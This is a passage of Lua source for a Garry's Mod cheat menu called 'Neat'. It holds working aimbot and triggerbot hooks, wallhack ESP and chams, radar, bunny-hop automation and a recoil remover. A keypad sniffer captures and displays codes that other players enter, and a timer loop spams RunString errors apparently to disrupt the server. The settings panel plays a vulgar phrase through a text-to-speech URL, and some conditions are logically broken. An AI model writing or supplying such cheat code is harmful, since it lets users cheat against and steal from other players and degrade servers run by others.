        draw.SimpleText("GO", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    edit = vgui.Create("DTextEntry", DermaFrame)
    edit:SetPos(10, 50)
    edit:SetParent(NEAT)
    edit:SetSize(260, 20)
    edit:SetText("55555555555555555555555")
    edit:SetMultiline(false)
    edit:SetEditable(true)
    edit:SetAllowNonAsciiCharacters(true)
    edit:SetEnterAllowed(true)
end

local function br()
    if NEAT1 then
        NEAT1 = not NEAT1
        Notify("Не ерорим")
        timer.Destroy("NEAT_spam1", 1, 0, function() end)
    else
        NEAT1 = not NEAT1
        Notify("Ерорим")
        timer.Create("NEAT_spam1", 0.000000000000000000000000000000000000000000000000000000001000000000000000000000000000011, 0, function()
            for l = 1, 10 do
                RunString("SERVER_GOVNO_MAMKY_EBAL____TI_4MO")
            end
        end)
    end
end

local function bs()
    local bt, bu, bv
    local ac = vgui.Create("DFrame")
    ac:SetSize(300, 300)
    ac:SetPos(10, 10)
    ac:SetTitle("")
    ac:SetVisible(true)
    ac:SetDraggable(true)
    ac:ShowCloseButton(false)
    ac.Paint = function(self)
        surface.SetDrawColor(70, 70, 70, 255)
        surface.DrawRect(0, 0, ac:GetWide(), ac:GetTall())
        surface.SetDrawColor(255, 214, 41, 255)
        surface.DrawOutlinedRect(0, 0, ac:GetWide(), ac:GetTall())
        draw.RoundedBox(0, 0, 0, 699, 22, Color(255, 214, 41))
        draw.SimpleText("Neat - radar", 'NEAT_15', 5, 3, Color(0, 0, 0, 255))
    end

    local a5 = vgui.Create("DButton", ac)
    a5:SetParent(ac)
    a5:SetText("")
    a5:SetPos(277, 1)
    a5:SetSize(22, 20)
    a5.DoClick = function() ac:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "NEAT_15", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    ac.PaintOver = function(self, t, u)
        local bw = Vector(ac:GetTall() / 2, ac:GetWide() / 2, 0)
        local bx = Vector(50, 50, 0)
        local by = 360 / (2 * math.pi * math.max(bx.x, bx.y) / 2)
        function ac:OnMousePressed()
            if self.m_bSizable and gui.MouseX() > self.x + self:GetWide() - 20 and gui.MouseY() > self.y + self:GetTall() - 20 then
                self.Sizing = {gui.MouseX() - self:GetWide(), gui.MouseY() - self:GetTall()}
                self:MouseCapture(true)
                return
            end

            if self:GetDraggable() then
                self.Dragging = {gui.MouseX() - self.x, gui.MouseY() - self.y}
                self:MouseCapture(true)
                return
            end
        end

        surface.SetDrawColor(255, 214, 41, 255)
        surface.DrawLine(ac:GetWide() / 1.94, ac:GetTall() / 2 - 250, ac:GetWide() / 1.94, ac:GetTall() / 2 + 260)
        surface.DrawLine(ac:GetWide() / 2 - 250, ac:GetTall() / 1.94, ac:GetWide() / 2 + 260, ac:GetTall() / 1.94)
        for x, p in pairs(player.GetAll()) do
            if o(p) then
                local n = LocalPlayer()
                local bz = p:GetPos()
                local bA = n:GetPos()
                local n = LocalPlayer()
                local bB = n:EyeAngles()
                local bC = ac:GetWide() / 2 + (bz.x - bA.x) / 20
                local bD = ac:GetTall() / 2 + (bA.y - bz.y) / 20
                local bE = bB.y - 90
                bE = math.rad(bE)
                bC = bC - ac:GetWide() / 2
                bD = bD - ac:GetTall() / 2
                local bF = bC * math.cos(bE) - bD * math.sin(bE)
                local bG = bC * math.sin(bE) + bD * math.cos(bE)
                bF = bF + ac:GetWide() / 2
                bG = bG + ac:GetTall() / 2
                draw.RoundedBox(1, bF, bG, 3, 3, Color(255, 214, 41))
            end
        end
    end
end

local bH = 0
local function bI(bJ)
    if LocalPlayer():Alive() then
        local bK = LocalPlayer():GetEyeTrace().Entity
        if bK:IsValid() then
            if IsValid(LocalPlayer():GetActiveWeapon()) then
                if bK:IsPlayer() or bK:IsNPC() then
                    if bH == 0 then
                        bJ:SetButtons(bit.bor(bJ:GetButtons(), IN_ATTACK))
                        bH = 1
                    else
                        bJ:SetButtons(bit.band(bJ:GetButtons(), bit.bnot(IN_ATTACK)))
                        bH = 0
                    end
                end
            end
        end
    end
end

local function bL()
    if NEAT_lol then
        NEAT_lol = not NEAT_lol
        Notify(Disable .. " TRIGERBOT")
        hook.Remove("CreateMove", "triggerbot")
    else
        NEAT_lol = not NEAT_lol
        Notify(Enable .. " TRIGERBOT")
        hook.Add("CreateMove", "triggerbot", bI)
    end
end

local function bM()
    if NEAT_lol then
        NEAT_lol = not NEAT_lol
        Notify(Disable .. " esp box")
        hook.Remove("HUDPaint", "ghfdghfdhfdghfhgfdh")
    else
        NEAT_lol = not NEAT_lol
        Notify(Enable .. " esp box")
        hook.Add("HUDPaint", "ghfdghfdhfdghfhgfdh", function()
            for x, p in pairs(player.GetAll()) do
                if o(p) then
                    ClrG = team.GetColor(p:Team())
                    local n = n
                    local bN = p:GetPos()
                    local bO = p:OBBMaxs()
                    local bP = p:OBBMins()
                    local bQ = p:EyeAngles()
                    cam.Start3D()
                    render.DrawWireframeBox(bN, Angle(0, bQ.y, 0), bP, bO, ClrG)
                    cam.End3D()
                end
            end
        end)
    end
end

local function bR()
    hook.Add("Think", "dfddddddddfd", function()
        for x, f in pairs(player.GetAll()) do
            f:SetWeaponColor(Vector(Color(255, 255, 255).r / 255, Color(255, 255, 255).g / 255, Color(255, 255, 255).b / 255))
            f:SetPlayerColor(Vector(Color(255, 255, 255).r / 255, Color(255, 255, 255).g / 255, Color(255, 255, 255).b / 255))
        end

        n:SetWeaponColor(Vector(Color(255, 214, 41).r / 255, Color(255, 214, 41).g / 255, Color(255, 214, 41).b / 255))
        n:SetPlayerColor(Vector(Color(255, 214, 41).r / 255, Color(255, 214, 41).g / 255, Color(255, 214, 41).b / 255))
        for x, af in pairs(player.GetAll()) do
            if af:IsAdmin() then
                af:SetWeaponColor(Vector(Color(255, 0, 0).r / 255, Color(255, 0, 0).g / 255, Color(255, 0, 0).b / 255))
                af:SetPlayerColor(Vector(Color(255, 0, 0).r / 255, Color(255, 0, 0).g / 255, Color(255, 0, 0).b / 255))
            end
        end
    end)
end

hook.Add("Think", "NEAT_bhop", function()
    if NEAT_bhop then
        if input.IsKeyDown(KEY_SPACE) then
            if LocalPlayer():IsOnGround() then
                if gui.IsGameUIVisible() or gui.IsConsoleVisible() or LocalPlayer():IsTyping() or LocalPlayer():GetMoveType() == MOVETYPE_NOCLIP then return end
                RunConsoleCommand("+jump")
                NEAT = 1
            else
                RunConsoleCommand("-jump")
                NEAT = 0
            end
        elseif NEAT_bhop and LocalPlayer():IsOnGround() then
            if NEAT == 1 then
                RunConsoleCommand("-jump")
                NEAT = 0
            end
        end
    end
end)

local bS = {}
bS.info = true
bS.infocol1 = Color(255, 214, 41, 255)
bS.infocol3 = Color(150, 150, 150, 255)
bS.infoscol1 = {}
bS.infocol2 = Color(0, 0, 0, 255)
bS.infodis = true
bS.infomon = true
bS.infohp = true
bS.infowep = true
bS.chams = true
bS.chamsc = Color(0, 161, 255, 255)
bS.chamssc = {}
bS.chamswep = true
bS.chamswepc = Color(255, 255, 255, 255)
local bT = {}
bT.Matinfo = {
    ["$basetexture"] = 'models/debug/debugwhite',
    ["$model"] = 1,
    ["$nocull"] = 1,
    ["$ignorez"] = 1
}

bT.Mat = CreateMaterial("chams", "VertexLitGeneric", bT.Matinfo)
function bT.StopVisualRecoil(n, pos, at, C)
    return GAMEMODE:CalcView(n, LocalPlayer():EyePos(), LocalPlayer():EyeAngles(), C, 0.1)
end

function NEAT_player_pod()
    if not bT.ESP then
        Notify(Enable .. " ESP")
        bT.ESP = true
        hook.Add('HUDPaint', 'AESP.Info', function()
            for x, p in pairs(player.GetAll()) do
                if not p == LocalPlayer() then
                    local bU = (p:GetPos() + Vector(0, 0, 100)):ToScreen()
                    local bV = bS.infocol1
                    if bS.infoscol1[p:GetUserGroup()] then
                        bV = bS.infoscol1[p:GetUserGroup()]
                    else
                        bV = bS.infocol1
                    end
                end
            end
        end)

        hook.Add('CalcView', 'StopVisualRecoil', bT.StopVisualRecoil)
        hook.Add('RenderScreenspaceEffects', 'Chams', function()
            cam.Start3D(LocalPlayer():EyePos(), LocalPlayer():EyeAngles())
            for x, p in pairs(player.GetAll()) do
                if not p == LocalPlayer() and p:Alive() then
                    render.SuppressEngineLighting(true)
                    local bV = bS.chamsc
                    if bS.chamssc[p:GetUserGroup()] then
                        bV = bS.chamssc[p:GetUserGroup()]
                    else
                        bV = bS.chamsc
                    end

                    render.SetColorModulation(bV.r / 255, bV.g / 255, bV.b / 255, 1)
                    render.MaterialOverride(bT.Mat)
                    p:DrawModel()
                    render.SetColorModulation(bS.chamswepc.r, bS.chamswepc.g, bS.chamswepc.b, 1)
                    if IsValid(p:GetActiveWeapon()) then p:GetActiveWeapon():DrawModel() end
                    render.SetColorModulation(1, 1, 1, 1)
                    render.MaterialOverride()
                    render.SetModelLighting(4, bV.r / 255, bV.g / 255, bV.b / 255)
                    p:DrawModel()
                    if IsValid(p:GetActiveWeapon()) then p:GetActiveWeapon():DrawModel() end
                    render.SuppressEngineLighting(false)
                end
            end

            cam.End3D()
        end)
    else
        bT.ESP = false
        Notify(Disable .. " ESP")
        hook.Remove('HUDPaint', 'AESP.Info')
        hook.Remove('CalcView', 'StopVisualRecoil')
        hook.Remove('RenderScreenspaceEffects', 'Chams')
    end
end

local function bW()
    if NEAT_lol then
        NEAT_lol = not NEAT_lol
        Notify(Disable .. " ELS PROP")
        hook.Remove("HUDPaint", "PropESP")
    else
        NEAT_lol = not NEAT_lol
        Notify(Enable .. " ELS PROP")
        hook.Add("HUDPaint", "PropESP", function()
            for x, p in pairs(ents.FindByClass("prop*")) do
                cam.Start3D(EyePos(), EyeAngles())
                if p:IsValid() then
                    render.SetBlend(0.3)
                    render.SetColorModulation(255, 214, 41)
                    p:DrawModel()
                    cam.End3D()
                end
            end
        end)
    end
end

function GAMEMODE:Detour(bX)
    if not self.oldFunctions then self.oldFunctions = {} end
    self.oldFunctions[bX] = self[bX] or function() end
    self[bX] = function(self, ...)
        local bY = {self.oldFunctions[bX](self, ...)}
        for x, p in next, self.addedHooks[bX] do
            local bZ = {p(...)}
            if #bZ ~= 0 then return unpack(bZ) end
        end
        return unpack(bY)
    end
end

function GAMEMODE:AddHook(bX, ae, func)
    if not self.addedHooks then self.addedHooks = {} end
    if not self.addedHooks[bX] then
        self.addedHooks[bX] = {}
        self:Detour(bX)
    end

    self.addedHooks[bX][ae] = func
end

function GAMEMODE:RemoveHook(bX, ae)
    if not self.addedHooks or not self.addedHooks[bX] then return end
    self.addedHooks[bX][ae] = nil
end

local function b_()
    if NEAT_ggfgaim then
        NEAT_ggfgaim = not NEAT_ggfgaim
        Notify(Disable)
        GAMEMODE:RemoveHook("RenderScene", "FFF")
        GAMEMODE:RemoveHook("PostDrawViewmodel", "F")
        GAMEMODE:RemoveHook("PreDrawEffects", "FF")
    else
        NEAT_ggfgaim = not NEAT_ggfgaim
        Notify(Enable)
        GAMEMODE:AddHook("RenderScene", "FFF", function() render.SetLightingMode(1 and 1 or 0) end)
        GAMEMODE:AddHook("PostDrawViewmodel", "F", function() render.SetLightingMode(0) end)
        GAMEMODE:AddHook("PreDrawEffects", "FF", function() render.SetLightingMode(0) end)
    end
end

local function c0()
    if NEAT_aim then
        NEAT_aim = not NEAT_aim
        Notify(Disable .. " AIMBOT 2")
        hook.Remove("Think", "NEAT_aimbot")
    else
        NEAT_aim = not NEAT_aim
        Notify(Enable .. " AIMBOT 2")
        hook.Add("Think", "NEAT_aimbot", function()
            local n = LocalPlayer()
            local F = util.GetPlayerTrace(n)
            local c1 = util.TraceLine(F)
            if c1.HitNonWorld then
                if c1.Entity:IsPlayer(isvalid) then
                    local c2 = c1.Entity:LookupBone("ValveBiped.Bip01_Spine")
                    if c2 == isvalid then
                        return
                    else
                        local c3 = c1.Entity:LookupBone("ValveBiped.Bip01_Head1")
                        local c4, c5 = c1.Entity:GetBonePosition(c3)
                        n:SetEyeAngles((c4 - n:GetShootPos()):Angle())
                    end
                end
            end
        end)
    end
end

local function c6()
    local c7 = vgui.Create("DFrame")
    c7:SetSize(500, 300)
    c7:Center()
    c7:SetTitle("")
    c7:ShowCloseButton(false)
    c7:MakePopup()
    c7.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, c7:GetWide(), c7:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, c7:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, c7:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - setting", "Roboto", c7:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", c7)
    a5:SetText("")
    a5:SetPos(c7:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() c7:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local c8 = vgui.Create("DColorMixer", c7)
    c8:SetPos(5, 30)
    c8:SetSize(200, 265)
    c8:SetPalette(false)
    c8:SetWangs(false)
    c8:SetAlphaBar(false)
    c8:SetColor(Color(GetConVarNumber("_menu_r"), GetConVarNumber("_menu_g"), GetConVarNumber("_menu_b"), 150))
    function c8:ValueChanged(bV)
        LocalPlayer():ConCommand("_menu_r " .. bV.r)
        LocalPlayer():ConCommand("_menu_g " .. bV.g)
        LocalPlayer():ConCommand("_menu_b " .. bV.b)
        NEAT_menu_colorgg = Color(GetConVarNumber("_menu_r"), GetConVarNumber("_menu_g"), GetConVarNumber("_menu_b"), 150)
    end

    local aD = vgui.Create('DButton', c7)
    aD:SetPos(210, 30)
    aD:SetSize(200, 30)
    aD:SetText("")
    aD.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(VoiceEnable, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if aD.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    aD.DoClick = function() k() end
    local c9 = vgui.Create("DComboBox", c7)
    c9:SetPos(210, 125)
    c9:SetSize(200, 30)
    c9:SetValue(CheatOpenButton)
    c9:AddChoice("INSERT")
    c9:AddChoice("DELETE")
    c9:AddChoice("END")
    c9:AddChoice("HOME")
    c9:AddChoice("O")
    c9:AddChoice("F1")
    c9:AddChoice("F2")
    c9:AddChoice("F3")
    c9:AddChoice("F4")
    c9:AddChoice("F5")
    c9:AddChoice("F6")
    c9:AddChoice("F7")
    c9:AddChoice("F8")
    c9:AddChoice("F11")
    c9.OnSelect = function(ca, aI, cb)
        if cb == "F4" then file.Write("Neat_cheat/NEAT_open_menu.txt", "95") end
        if cb == "F6" then file.Write("Neat_cheat/NEAT_open_menu.txt", "97") end
        if cb == "F7" then file.Write("Neat_cheat/NEAT_open_menu.txt", "98") end
        if cb == "F1" then file.Write("Neat_cheat/NEAT_open_menu.txt", "92") end
        if cb == "F3" then file.Write("Neat_cheat/NEAT_open_menu.txt", "94") end
        if cb == "F2" then file.Write("Neat_cheat/NEAT_open_menu.txt", "93") end
        if cb == "DELETE" then file.Write("Neat_cheat/NEAT_open_menu.txt", "73") end
        if cb == "F5" then file.Write("Neat_cheat/NEAT_open_menu.txt", "96") end
        if cb == "INSERT" then file.Write("Neat_cheat/NEAT_open_menu.txt", "72") end
        if cb == "F8" then file.Write("Neat_cheat/NEAT_open_menu.txt", "99") end
        if cb == "F11" then file.Write("Neat_cheat/NEAT_open_menu.txt", "102") end
        if cb == "END" then file.Write("Neat_cheat/NEAT_open_menu.txt", "75") end
        if cb == "HOME" then file.Write("Neat_cheat/NEAT_open_menu.txt", "74") end
        if cb == "O" then file.Write("Neat_cheat/NEAT_open_menu.txt", "25") end
        Notify("выбрано")
    end

    local cc = vgui.Create("DComboBox", c7)
    cc:SetPos(210, 160)
    cc:SetSize(200, 30)
    cc:SetValue(Voice)
    cc:AddChoice("Jane")
    cc:AddChoice("Oksana")
    cc:AddChoice("Alyss")
    cc:AddChoice("Omazh")
    cc:AddChoice("Zahar")
    cc:AddChoice("Ermil")
    cc.OnSelect = function(ca, aI, cb)
        if cb == "Jane" then file.Write("Neat_cheat/NEAT_psina_golos.txt", "jane") end
        if cb == "Oksana" then file.Write("Neat_cheat/NEAT_psina_golos.txt", "oksana") end
        if cb == "Alyss" then file.Write("Neat_cheat/NEAT_psina_golos.txt", "alyss") end
        if cb == "Omazh" then file.Write("Neat_cheat/NEAT_psina_golos.txt", "omazh") end
        if cb == "Zahar" then file.Write("Neat_cheat/NEAT_psina_golos.txt", "zahar") end
        if cb == "Ermil" then
            file.Write("Neat_cheat/NEAT_psina_golos.txt", "ermil")
            Golos = "ermil"
        end

        fhfhgfh = file.Read("Neat_cheat/NEAT_psina_golos.txt", "DATA")
        sound.PlayURL("http://tts.voicetech.yandex.net/tts?format=mp3&quality=hi&platform=web&application=translate&lang=ru_RU&speaker=" .. file.Read("Neat_cheat/NEAT_psina_golos.txt", "DATA") .. "&emotion=neutral&text=" .. urlencode("я люблю дрочить"), "mono", function() end)
    end

    edit = vgui.Create("DTextEntry", c7)
    edit:SetPos(210, 65)
    edit:SetSize(200, 22)
    edit:SetText(file.Read("Neat_cheat/NEAT_set_spam_text.txt", "DATA"))
    edit:SetMultiline(false)
    edit:SetEditable(true)
    edit:SetAllowNonAsciiCharacters(true)
    edit:SetEnterAllowed(true)
    edit.OnEnter = function()
        Notify("установлено '" .. edit:GetValue() .. "'")
        file.Write("Neat_cheat/NEAT_set_spam_text.txt", edit:GetValue())
    end

    local c9 = vgui.Create("DComboBox", c7)
    c9:SetPos(210, 90)
    c9:SetSize(200, 30)
    c9:SetValue(LanguageSwitch)
    c9:AddChoice("Рус")
    c9:AddChoice("Eng")
    c9.OnSelect = function(ca, aI, cb)
        if cb == "Рус" then file.Write("Neat_cheat/NEAT_lang.txt", "ru") end
        if cb == "Eng" then file.Write("Neat_cheat/NEAT_lang.txt", "en") end
        h("retry cheat")
    end

    local aD = vgui.Create('DButton', c7)
    aD:SetPos(210, 265)
    aD:SetSize(200, 30)
    aD:SetText("")
    aD.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(Reset, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if aD.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    aD.DoClick = function()
        file.Write("Neat_cheat/NEAT_set_spam_text.txt", "спам текст")
        file.Write("Neat_cheat/NEAT_open_menu.txt", "72")
        file.Write("Neat_cheat/NEAT_psina_golos.txt", "jane")
        file.Write("Neat_cheat/NEAT_set_psina.txt", "1")
        RunConsoleCommand("_menu_r", "40")
        RunConsoleCommand("_menu_g", "120")
        RunConsoleCommand("_menu_b", "200")
        NEAT_menu_colorgg = Color(40, 120, 200, 150)
        c7:Close()
    end
end

local function cd()
    if NEAT_pricel then
        NEAT_pricel = not NEAT_pricel
        Notify(Disable .. " прицел")
        hook.Remove("HUDPaint", "NEAT_pricel")
    else
        NEAT_pricel = not NEAT_pricel
        Notify(Enable .. " прицел")
        hook.Add("HUDPaint", "NEAT_pricel", function()
            local aT = n:GetEyeTrace().HitPos:ToScreen()
            local ce, cf = aT.x, aT.y
            local cg = n:GetActiveWeapon()
            if IsValid(cg) then cg = cg:GetClass() end
            if n:IsValid() then
                surface.SetDrawColor(255, 255, 255, 255)
                local ch = 5
                local ci = ch + 5
                surface.DrawLine(ce - ci, cf, ce - ch, cf)
                surface.DrawLine(ce + ci, cf, ce + ch, cf)
                surface.DrawLine(ce, cf - ci, ce, cf - ch)
                surface.DrawLine(ce, cf + ci, ce, cf + ch)
            end
        end)
    end
end

local cj = {}
local function ck()
    table.insert(cj, LocalPlayer():GetPos())
end

local function cl()
    if #cj > 0 then
        local cn = 99999
        local co = 0
        for x, p in pairs(cj) do
            if p:Distance(LocalPlayer():GetPos()) < cn then
                cn = p:Distance(LocalPlayer():GetPos())
                co = x
            end
        end

        table.remove(cj, co)
    end
end

local cp = CreateClientConVar("lix_lesp_radar", 0, true, false)
local cq = CreateClientConVar("lix_lesp_radarx", 0, true, false)
local cr = CreateClientConVar("lix_lesp_radary", 0, true, false)
local cs = CreateClientConVar("lix_lesp_radarw", 400, true, false)
local ct = CreateClientConVar("lix_lesp_radarh", 300, true, false)
local cu = CreateClientConVar("lix_lesp_radarfov", 300, true, false)
local cv = CreateClientConVar("lix_lesp_radarauto", 1, true, false)
function LESPDraw()
    local cw = {}
    cw.angles = Angle(90, LocalPlayer():EyeAngles().y, 0)
    local cx = cu:GetInt()
    if cv:GetInt() > 0 then
        local F = {}
        F.start = LocalPlayer():GetPos() + Vector(0, 0, 5)
        F.endpos = LocalPlayer():GetPos() + Vector(0, 0, cu:GetInt())
        F.filter = LocalPlayer()
        if util.TraceLine(F).Hit then cx = util.TraceLine(F).HitPos.z - 5 - LocalPlayer():GetPos().z end
    end

    cw.origin = LocalPlayer():GetPos() + Vector(0, 0, cx)
    cw.x = cq:GetInt()
    cw.y = cr:GetInt()
    cw.w = cs:GetInt()
    cw.h = ct:GetInt()
    render.RenderView(cw)
    surface.SetDrawColor(0, 0, 0, 255)
    surface.DrawOutlinedRect(cq:GetInt(), cr:GetInt(), cs:GetInt(), ct:GetInt())
    surface.SetDrawColor(255, 255, 255, 255)
    surface.DrawRect(ScrW() / 2 - 1, ScrH() / 2 - 1, 2, 2)
end

for x, p in pairs(cj) do
    local cy = p:ToScreen()
    surface.SetDrawColor(0, 0, 0, 50)
    surface.SetFont("Default")
    surface.DrawRect(cy.x - surface.GetTextSize("DET " .. x) / 2, cy.y + 7, surface.GetTextSize("DET " .. x) + 2, 12)
    surface.SetTextColor(255, 255, 255, 255)
    surface.SetTextPos(cy.x - surface.GetTextSize("DET " .. x) / 2 + 1, cy.y + 6)
    surface.DrawText("Détecteur " .. x)
    surface.SetDrawColor(0, 0, 0, 255)
    surface.DrawRect(cy.x - 2, cy.y - 2, 4, 4)
    surface.SetDrawColor(200, 50, 50, 255)
    surface.DrawRect(cy.x - 1, cy.y - 1, 2, 2)
    for l = 1, 6 do
        local cy = (p + Vector(math.sin(l * 1) * LESPDetectThreshold:GetInt(), math.cos(l * 1) * LESPDetectThreshold:GetInt(), 0)):ToScreen()
        local cz = (p + Vector(math.sin((l + 1) * 1) * LESPDetectThreshold:GetInt(), math.cos((l + 1) * 1) * LESPDetectThreshold:GetInt(), 0)):ToScreen()
        surface.SetDrawColor(255, 0, 0, 255)
        surface.DrawLine(cy.x, cy.y, cz.x, cz.y)
    end
end

local function cA()
    if NEAT1 then
        NEAT1 = not NEAT1
        Notify(Radar .. " off")
        hook.Remove("HUDPaint", "LESP")
    else
        NEAT1 = not NEAT1
        Notify(Radar .. " on")
        hook.Add("HUDPaint", "LESP", LESPDraw)
    end
end

local cB = Material("gui/gradient")
function Vision()
    local me = LocalPlayer()
    if not me:IsValid() then return end
    local cC = me:GetEyeTrace().Entity
    for x, p in pairs(ents.GetAll()) do
        if IsValid(p) and string.find(p:GetClass(), "Keypad") then
            if not p == cC and me:GetPos():Distance(p:GetPos()) < 10000000000000000000 then
                local pos = p:GetPos():ToScreen()
                if pos.x > 0 and pos.x < ScrW() and pos.y > 0 and pos.y < ScrH() then
                    if not (p.code and p.code == "") then
                        draw.SimpleText(p.code, "TargetID", pos.x + 5, pos.y + 6, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
                    else
                        if not (p.tempCode and p.tempCode == "") then draw.SimpleText(p.tempCode, "TargetID", pos.x + 5, pos.y + 6, Color(255, 255, 255), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER) end
                    end
                end
            end
        end
    end
end

local cD = {
    {
        x = 0.075,
        y = 0.04,
        w = 0.85,
        h = 0.25
    },
    {
        x = 0.075,
        y = 0.04 + 0.25 + 0.03,
        w = 0.85 / 2 - 0.04 / 2 + 0.05,
        h = 0.125,
        text = "ABORT"
    },
    {
        x = 0.5 + 0.04 / 2 + 0.05,
        y = 0.04 + 0.25 + 0.03,
        w = 0.85 / 2 - 0.04 / 2 - 0.05,
        h = 0.125,
        text = "OK"
    }
}

do
    for l = 1, 9 do
        local cE = (l - 1) % 3
        local cF = math.floor((l - 1) / 3)
        local cG = {
            x = 0.075 + 0.3 * cE,
            y = 0.175 + 0.25 + 0.05 + 0.5 / 3 * cF,
            w = 0.25,
            h = 0.13,
            text = tostring(l)
        }

        table.insert(cD, cG)
    end
end

function CalculateKeypadCursorPos(n, cH)
    if not n:IsValid() then return end
    local cI = util.TraceLine({
        start = n:EyePos(),
        endpos = n:EyePos() + n:GetAimVector() * 65,
        filter = n
    })

    if not cI.Entity or cI.Entity ~= cH then return 0, 0 end
    local bx = cH.Scale
    if not bx then return 0, 0 end
    local pos, B = cH:CalculateRenderPos(), cH:CalculateRenderAng()
    if not pos or not B then return 0, 0 end
    local cJ = cH:GetForward()
    local cK = util.IntersectRayWithPlane(n:EyePos(), n:GetAimVector(), pos, cJ)
    if not cK then return 0, 0 end
    local al = pos - cK
    local ce = al:Dot(-B:Forward()) / bx
    local cf = al:Dot(-B:Right()) / bx
    return ce, cf
end

function KPGetHoveredElement(n, cH)
    local bx = cH.Scale
    local t, u = cH.Width2D, cH.Height2D
    local ce, cf = CalculateKeypadCursorPos(n, cH)
    for j, cG in ipairs(cD) do
        local cL = t * cG.x
        local cM = u * cG.y
        local cN = t * cG.w
        local cO = u * cG.h
        if cL < ce and cL + cN > ce and cM < cf and cM + cO > cf then return cG end
    end
end

function Logic()
    local me = LocalPlayer()
    if not me:IsValid() then return end
    for x, p in pairs(player.GetAll()) do
        local cP = p:GetEyeTrace().Entity
        if IsValid(cP) and IsValid(p) and string.find(cP:GetClass(), "Keypad") and p:EyePos():Distance(cP:GetPos()) <= 120 then
            cP.tempCode = cP.tempCode or ""
            cP.tempText = cP.tempText or ""
            cP.tempStatus = cP.tempStatus or 0
            if not cP:GetText() == cP.tempText or not cP:GetStatus() == cP.tempStatus then
                cP.tempText = cP:GetText()
                cP.tempStatus = cP:GetStatus()
                if cP.tempText and not cP:GetSecure() then
                    cP.tempCode = cP.tempText
                    timer.Simple(0, function() if cP:GetStatus() == 1 and cP.tempCode and not cP.tempCode == "" then cP.code = cP.tempCode end end)
                else
                    local l = KPGetHoveredElement(p, cP)
                    if l then l = l.text end
                    if cP.tempText then timer.Simple(0, function() if cP:GetStatus() == 1 and cP.tempCode and not cP.tempCode == "" then cP.code = cP.tempCode end end) end
                    if cP.tempText == "" and cP:GetStatus() == 2 then cP.tempCode = "" end
                    timer.Simple(0, function() if tonumber(l) and not cP:GetText():len() == 0 then cP.tempCode = cP.tempCode .. l end end)
                end
            end
        end
    end
end

local function cQ()
    return ents.FindByClass("Keypad")
end

hook.Add("HUDPaint", "HUD", Vision)
hook.Add("Think", "logic", Logic)
local function cR()
    if NEAT_lol then
        NEAT_lol = not NEAT_lol
        Notify(Disable)
        hook.Remove("HUDPaint", "HUD")
        hook.Remove("Think", "Gaypads")
        hook.Remove("HUDPaint", "Gaypads")
    else
        NEAT_lol = not NEAT_lol
        hook.Add("Think", "Gaypads", function()
            local cS = cQ()
            for x, p in pairs(cS) do
                if IsValid(p) then
                    if not isbool(p.hacked) then p.hacked = false end
                    if not p.hacked then
                        if p:GetStatus() == 1 then
                            if not (p:GetText() == "****") then
                                p.hacked = true
                                p.passi = p:GetText()
                            end
                        end
                    end
                end
            end
        end)

        hook.Add("HUDPaint", "HUD", Vision)
        hook.Add("HUDPaint", "Gaypads", function()
            for x, p in pairs(cQ()) do
                if p.hacked then
                    local pos = p:GetPos():ToScreen()
                    draw.SimpleText(p.passi, "TargetID", pos.x + 25, pos.y + 20, Color(255, 0, 0), 1, 1)
                end
            end
        end)

        Notify(Enable)
    end
end

Enabled = false
ViewOrigin = Vector(0, 0, 0)
ViewAngle = Angle(0, 0, 0)
Velocity = Vector(0, 0, 0)
function CalcView(n, cT, at, C)
    if not Enabled then return end
    if SetView then
        ViewOrigin = cT
        ViewAngle = at
        SetView = false
    end
    return {
        origin = ViewOrigin,
        angles = ViewAngle
    }
end

hook.Add("CalcView", "NEAT", CalcView)
function CreateMove(bJ)
    if not Enabled then return end
    local bb = FrameTime()
    ViewOrigin = ViewOrigin + Velocity * bb
    Velocity = Velocity * 0.56
    local cU = 0.022
    ViewAngle.p = math.Clamp(ViewAngle.p + bJ:GetMouseY() * cU, -89, 89)
    ViewAngle.y = ViewAngle.y + bJ:GetMouseX() * -1 * cU
    local cV = Vector(0, 0, 0)
    local B = ViewAngle
    if bJ:KeyDown(IN_FORWARD) then cV = cV + B:Forward() end
